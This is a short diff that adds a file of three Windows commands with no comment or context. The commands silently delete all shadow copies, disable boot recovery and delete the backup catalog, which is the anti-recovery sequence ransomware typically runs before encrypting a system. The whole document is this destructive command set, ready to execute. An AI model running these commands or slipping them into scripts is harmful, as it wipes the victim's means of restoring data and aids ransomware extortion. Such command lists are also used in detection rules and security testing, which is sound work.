@@ -1,0 +1,4 @@
+vssadmin.exe delete shadows /all /quiet
+bcdedit /set {default} recoveryenabled no
+wbadmin delete catalog -quiet
+
